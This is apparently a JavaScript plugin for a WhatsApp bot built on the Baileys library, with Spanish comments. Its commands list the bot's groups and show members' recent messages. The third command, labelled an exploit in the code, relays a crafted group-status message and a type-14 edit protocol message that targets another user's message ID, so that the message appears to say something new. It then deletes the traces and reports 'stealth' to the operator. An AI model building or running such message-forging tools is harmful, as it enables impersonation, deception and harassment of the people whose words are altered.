import { delay } from '@whiskeysockets/baileys';

global.cachedGroupList = global.cachedGroupList || [];

export default {
    name: 'titiritero_remoto',
    match: (text) => /^\.(grupos|mensajes|titiritero)(\s+.*|$)/i.test((text || '').trim()),

    execute: async ({ sock, msg, remitente, textoLimpio, quoted }) => {
        const cmd = textoLimpio.split(/\s+/)[0].toLowerCase();
        const args = textoLimpio.slice(cmd.length).trim();

        // ==========================================
        // 1. COMANDO: .grupos (Listar grupos del bot)
        // ==========================================
        if (cmd === '.grupos') {
            try {
                const groupsObj = await sock.groupFetchAllParticipating();
                const list = Object.values(groupsObj);
                global.cachedGroupList = list;

                if (list.length === 0) {
                    return sock.sendMessage(remitente, { text: "⚠️ El bot no está en ningún grupo actualmente." }, { quoted: msg });
                }

                let texto = `🎭 *GRUPOS ACTIVOS (MODO TITIRITERO)*\n\n`;
                list.forEach((g, idx) => {
                    texto += `*[${idx + 1}]* ${g.subject || 'Sin nombre'}\n   └ ID: \`${g.id}\`\n`;
                });
                texto += `\n📌 *Para ver los últimos mensajes:* \`.mensajes <número>\`\n_Ejemplo:_ \`.mensajes 1\``;

                return sock.sendMessage(remitente, { text: texto }, { quoted: msg });
            } catch (err) {
                console.error("Error al obtener grupos:", err);
                return sock.sendMessage(remitente, { text: `❌ Error al listar grupos: ${err.message}` }, { quoted: msg });
            }
        }

        // ==========================================
        // 2. COMANDO: .mensajes (Listar mensajes de un grupo)
        // ==========================================
        if (cmd === '.mensajes') {
            let targetJid = null;
            let groupName = 'Grupo';

            const idx = parseInt(args, 10);
            if (!isNaN(idx) && global.cachedGroupList[idx - 1]) {
                targetJid = global.cachedGroupList[idx - 1].id;
                groupName = global.cachedGroupList[idx - 1].subject || 'Grupo';
            } else if (args && args.endsWith('@g.us')) {
                targetJid = args;
            } else if (global.lastViewedGroup) {
                targetJid = global.lastViewedGroup;
            } else if (global.cachedGroupList.length > 0) {
                targetJid = global.cachedGroupList[0].id;
                groupName = global.cachedGroupList[0].subject || 'Grupo';
            }

            if (!targetJid) {
                return sock.sendMessage(remitente, { 
                    text: "❌ No se especificó el grupo.\nUsa primero `.grupos` y luego `.mensajes 1`." 
                }, { quoted: msg });
            }

            global.lastViewedGroup = targetJid;
            const buffer = global.recentGroupMessages?.get(targetJid) || [];

            if (buffer.length === 0) {
                return sock.sendMessage(remitente, { 
                    text: `📜 *MENSAJES EN: ${groupName}*\n\n⚠️ No hay mensajes registrados en memoria aún para este grupo.\n_Pide o espera a que alguien escriba en el grupo mientras el bot está activo._` 
                }, { quoted: msg });
            }

            let texto = `📜 *MENSAJES RECIENTES EN: ${groupName}*\n\n`;
            buffer.slice(0, 15).forEach((m, i) => {
                const autor = m.participant ? m.participant.split('@')[0] : 'Desconocido';
                texto += `*[${i + 1}]* +${autor}: "${m.text}"\n   └ ID: \`${m.id}\`\n`;
            });
            texto += `\n🎭 *Para editar en vivo sin escribir en el grupo:*\n\`.titiritero <número> | <nuevo_texto>\`\n_Ejemplo:_ \`.titiritero 1 | Yo invito la comida hoy\``;

            return sock.sendMessage(remitente, { text: texto }, { quoted: msg });
        }

        // ==========================================
        // 3. COMANDO: .titiritero (Modificación remota en vivo)
        // ==========================================
        if (cmd === '.titiritero') {
            let targetGroupJid = global.lastViewedGroup;
            let targetStanzaId = null;
            let targetParticipant = '';
            let nuevoTexto = '';

            // Caso A: Citar un mensaje en privado que tenga contexto
            const quotedContext = msg.message?.extendedTextMessage?.contextInfo;
            if (quotedContext?.stanzaId) {
                targetStanzaId = quotedContext.stanzaId;
                targetParticipant = quotedContext.participant || '';
                nuevoTexto = args.trim();
            }

            // Caso B: Parsear argumentos con delimitador '|'
            if (!targetStanzaId) {
                const sepIndex = args.indexOf('|');
                if (sepIndex === -1) {
                    return sock.sendMessage(remitente, { 
                        text: "❌ Formato incorrecto.\n📌 *Uso:* `.titiritero <número_mensaje> | <nuevo_texto>`\n_Ejemplo:_ `.titiritero 1 | Hola a todos`\nO si tienes el ID: `.titiritero <ID_MENSAJE> | <nuevo_texto>`" 
                    }, { quoted: msg });
                }

                const targetSelector = args.slice(0, sepIndex).trim();
                nuevoTexto = args.slice(sepIndex + 1).trim();

                if (!nuevoTexto) {
                    return sock.sendMessage(remitente, { text: "❌ Introduce el nuevo texto de reemplazo." }, { quoted: msg });
                }

                // Subcaso: Selector numérico (ej: "1" o "1 2" donde 1 es grupo y 2 es mensaje)
                const selectorParts = targetSelector.split(/\s+/);
                if (selectorParts.length === 2 && !isNaN(parseInt(selectorParts[0], 10)) && !isNaN(parseInt(selectorParts[1], 10))) {
                    const gIdx = parseInt(selectorParts[0], 10) - 1;
                    const mIdx = parseInt(selectorParts[1], 10) - 1;
                    if (global.cachedGroupList[gIdx]) {
                        targetGroupJid = global.cachedGroupList[gIdx].id;
                        const buf = global.recentGroupMessages?.get(targetGroupJid) || [];
                        if (buf[mIdx]) {
                            targetStanzaId = buf[mIdx].id;
                            targetParticipant = buf[mIdx].participant;
                        }
                    }
                } else if (!isNaN(parseInt(targetSelector, 10))) {
                    const mIdx = parseInt(targetSelector, 10) - 1;
                    if (!targetGroupJid && global.cachedGroupList.length > 0) {
                        targetGroupJid = global.cachedGroupList[0].id;
                    }
                    if (targetGroupJid) {
                        const buf = global.recentGroupMessages?.get(targetGroupJid) || [];
                        if (buf[mIdx]) {
                            targetStanzaId = buf[mIdx].id;
                            targetParticipant = buf[mIdx].participant;
                        }
                    }
                } else {
                    // Tratar targetSelector directamente como ID de mensaje
                    targetStanzaId = targetSelector;
                }
            }

            if (!targetGroupJid) {
                return sock.sendMessage(remitente, { 
                    text: "❌ No se ha fijado ningún grupo objetivo.\nEjecuta primero `.grupos` y `.mensajes 1`." 
                }, { quoted: msg });
            }

            if (!targetStanzaId) {
                return sock.sendMessage(remitente, { 
                    text: "❌ No se pudo localizar el mensaje especificado en la memoria del grupo." 
                }, { quoted: msg });
            }

            // Ejecución remota del exploit en el grupo objetivo
            try {
                // 1. Relay del mensaje temporal con estado de grupo en el grupo objetivo
                const tempId = await sock.relayMessage(
                    targetGroupJid,
                    {
                        extendedTextMessage: {
                            text: '',
                            contextInfo: {
                                isGroupStatus: true
                            }
                        }
                    },
                    {
                        quoted: {
                            key: {
                                remoteJid: targetGroupJid,
                                id: targetStanzaId,
                                fromMe: false,
                                participant: targetParticipant || undefined
                            },
                            message: {
                                conversation: ''
                            }
                        }
                    }
                );

                // 2. Relay de ProtocolMessage tipo 14 dirigido al stanzaId objetivo
                const tempId2 = await sock.relayMessage(
                    targetGroupJid,
                    {
                        protocolMessage: {
                            key: {
                                jid: targetGroupJid,
                                fromMe: true,
                                id: tempId
                            },
                            type: 14,
                            editedMessage: {
                                extendedTextMessage: {
                                    text: nuevoTexto,
                                    contextInfo: {
                                        isGroupStatus: false
                                    }
                                }
                            }
                        }
                    },
                    {
                        messageId: targetStanzaId
                    }
                );

                await delay(100);

                // 3. Limpieza inmediata de los temporales en el grupo
                await Promise.allSettled([
                    sock.sendMessage(targetGroupJid, {
                        delete: {
                            remoteJid: targetGroupJid,
                            id: tempId,
                            fromMe: true
                        }
                    }),
                    sock.sendMessage(targetGroupJid, {
                        delete: {
                            remoteJid: targetGroupJid,
                            id: tempId2,
                            fromMe: true
                        }
                    })
                ]);

                // 4. Confirmación privada al propietario
                await sock.sendMessage(remitente, {
                    text: `✅ *[TITIRITERO EJECUTADO]*\n\n🎯 *Objetivo:* \`${targetStanzaId}\`\n💬 *Nuevo contenido:* "${nuevoTexto}"\n🔒 *Sigilo:* Acción completada en el grupo sin escribir en él.`
                }, { quoted: msg });

            } catch (err) {
                console.error("Error Titiritero:", err);
                await sock.sendMessage(remitente, { 
                    text: `❌ Error al ejecutar el titiritero: ${err.message}` 
                }, { quoted: msg });
            }
        }
    }
};
